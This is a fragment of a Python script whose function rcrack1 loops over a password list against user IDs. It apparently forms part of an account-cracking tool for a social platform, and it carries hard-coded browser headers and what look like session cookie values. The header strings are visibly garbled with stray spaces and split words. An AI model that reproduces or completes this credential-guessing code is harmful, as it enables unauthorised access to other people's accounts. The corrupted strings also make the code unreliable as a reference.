...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'accept':' text /html , application /xh tml +xml , application /xml ; g=0 .9, image/avif, image/webp , image / apng, */*; q=0.8, applicatic',
            'n/signed- exchange; v=b3 ;q=0.9',
            'cookie':' datr=ONEQZ JbJJisntuChLICQ2Ht; sb=ONEQZJrp7jZkAI jmuSGAtopb',
